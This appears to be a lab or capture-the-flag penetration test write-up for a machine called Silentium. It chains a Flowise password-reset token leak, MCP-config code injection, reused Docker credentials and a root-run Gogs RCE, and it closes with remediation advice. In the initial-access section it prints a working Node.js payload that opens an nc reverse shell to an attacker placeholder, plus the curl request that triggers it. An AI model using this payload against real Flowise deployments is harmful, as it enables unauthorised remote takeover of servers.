# Penetration Test Report: Silentium

**Date:** June 2026
**Target:** Silentium (10.129.12.167)
**Objective:** Perform a full-scope penetration test to identify vulnerabilities, exploit attack vectors, and provide actionable remediation strategies.

---

## 1. Executive Summary

During the penetration test of the Silentium infrastructure, multiple critical security flaws were identified, leading to a complete system compromise (Root access). The engagement highlighted significant risks associated with the deployment of third-party AI integration tools (Flowise) and internal version control systems (Gogs). 

The attack path successfully chained an Authentication Bypass vulnerability, an insecure feature implementation leading to Remote Code Execution (RCE) in a Docker container, credential exposure via environment variables, and a final RCE on an internal, overly-privileged service. 

**Key Findings:**

* **Critical:** Authentication Bypass in Flowise API via Token Leak (CVE-2025-58434).
* **Critical:** Remote Code Execution (RCE) via insecure Model Context Protocol (MCP) configuration.
* **High:** Sensitive credentials exposed in Docker environment variables.
* **Critical:** Internal Gogs service running as `root`, vulnerable to RCE (CVE-2025-8110).

---

## 2. Attack Narrative & Methodology

### 2.1. Reconnaissance & Enumeration

Initial network scanning using Nmap revealed two open TCP ports:

* `22/tcp` - SSH
* `80/tcp` - HTTP (Nginx 1.24.0)

Direct access to the web server yielded a static landing page for an institutional financial firm. To identify hidden attack surfaces, virtual host (VHost) fuzzing was conducted. By filtering out default `301 Redirect` responses, a hidden staging environment was discovered:

* **Discovered VHost:** `staging.silentium.htb`

### 2.2. Initial Access (Auth Bypass & RCE)

The staging environment hosted an instance of **Flowise**, a visual builder for AI agents.

**Authentication Bypass:**
Analysis of the password reset mechanism revealed a critical flaw (CVE-2025-58434). By submitting a password reset request for a known user (`ben@silentium.htb`), the API endpoint `/api/v1/account/forgot-password` returned a `201 Created` status along with a JSON response that leaked the temporary reset token:

```json
{
  "user": { ... },
  "tempToken": "joGrbtSDcmsHBglPBIC3eVuYpuqPp6Ccy9veSL9iw9nTMh7NCpzTVrwr6nkEiD9o",
  "status": "active"
}

```

Using this leaked token, the password for the administrative user `ben` was successfully changed, granting full access to the Flowise dashboard.
I using this (PoC)<https://github.com/advisories/GHSA-wgpv-6j63-x5ph>

**Remote Code Execution:**
Within Flowise, the "Custom MCP" (Model Context Protocol) integration feature was leveraged. The `mcpServerConfig` parameter did not properly sanitize input, allowing for Node.js arbitrary code execution. A payload utilizing `child_process` was injected to spawn a reverse shell:

```javascript
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f');return 1;})()} )"
  }
}

```

Triggering this configuration via a POST request to `/api/v1/node-load-method/customMCP` resulted in a reverse shell as `root` inside the Flowise Docker container.

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
     -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1f**************" \
     -H "Content-Type: application/json" \
     -d @payload.json
```

### 2.3. Lateral Movement (Docker Escape)

Inside the compromised Docker container, enumeration of the environment (`env`) revealed hardcoded infrastructure credentials:

```text
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=F1l3_************
SMTP_PASSWORD=r04D!************

```

These credentials were reused across the infrastructure. Connecting via SSH to the main host (`10.129.12.167`) using the discovered password (`F1l3**********`) successfully authenticated the user `ben`, achieving lateral movement from the isolated container to the underlying host.

### 2.4. Privilege Escalation (Internal Network Pivot)

Host enumeration via `netstat` and Nginx configuration analysis revealed an internal service listening on `127.0.0.1:3001`, mapped to `staging-v2-code.dev.silentium.htb`.

Local port forwarding was established via SSH to access this internal service. The application was identified as **Gogs** (a self-hosted Git service).

1. A new user account was registered on the Gogs instance to obtain a valid authentication token.
2. The Gogs instance was found to be vulnerable to an RCE exploit (CVE-2025-8110)"<https://github.com/TYehan/CVE-2025-8110-Gogs-RCE-Exploit>"
3. Because the Gogs process was improperly configured to run as the `root` user, exploiting this vulnerability resulted in an immediate, full system compromise.

---

## 3. Vulnerabilities & Remediation Strategies

### 3.1. API Information Disclosure / Auth Bypass (Flowise)

* **Vulnerability:** The password reset API endpoint leaks the authentication token in the HTTP response body, completely bypassing email verification requirements.
* **Remediation:** Upgrade Flowise to the latest stable version where CVE-2025-58434 is patched. Ensure that API responses for password resets only return generic success messages (e.g., `200 OK`) without echoing sensitive tokens or user parameters.

### 3.2. RCE via Insecure External Integrations (MCP)

* **Vulnerability:** The Custom MCP node execution environment fails to sandbox user-supplied configurations, allowing arbitrary Node.js code execution.
* **Remediation:** Implement strict input validation for MCP server configurations. Execute external tool integrations within heavily restricted sandboxes (e.g., using `vm2` securely or restricted WebAssembly modules) and drop OS-level execution privileges (`child_process`).

### 3.3. Hardcoded Secrets in Environment Variables

* **Vulnerability:** Sensitive passwords (UI credentials, SMTP) are stored in plaintext within the Docker environment, allowing any attacker who breaches the container to pivot.
* **Remediation:** Adopt a secret management solution (e.g., HashiCorp Vault, AWS Secrets Manager, or Docker Swarm/Kubernetes Secrets). Do not pass raw passwords via `env` vars; instead, mount them securely at runtime. Avoid password reuse across different infrastructure layers.

### 3.4. Violation of Least Privilege (Gogs as Root)

* **Vulnerability:** The internal Gogs version control system was executing under the `root` user context. When an application-level RCE was exploited, it granted the highest possible system privileges.
* **Remediation:** Adhere to the Principle of Least Privilege. Create a dedicated, unprivileged system user (e.g., `git` or `gogs`) to run the Gogs service. Bind the service to ports above 1024 or use a reverse proxy to handle port 80/443 traffic without requiring root permissions for the backend application.